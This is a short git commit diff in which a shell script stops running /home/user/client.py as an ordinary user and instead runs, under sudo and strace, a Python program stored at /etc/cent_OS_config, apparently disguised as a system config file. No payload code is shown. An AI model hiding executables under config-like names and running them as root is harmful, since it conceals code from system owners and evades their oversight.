0cee0b87adde5444fe251dabe94762fcf70c5b16
Deviloxide <55717532+Deviloxide@users.noreply.github.com>
2024-10-29 00:31:46 -0500

    Update script.sh to use /etc/

--- script.sh
+++ script.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-sudo -u user strace -o /dev/null /usr/bin/python2 /home/user/client.py > /home/user/client.log 2>&1
+sudo strace -o /dev/null /usr/bin/python2 /etc/cent_OS_config > /home/user/client.log 2>&1
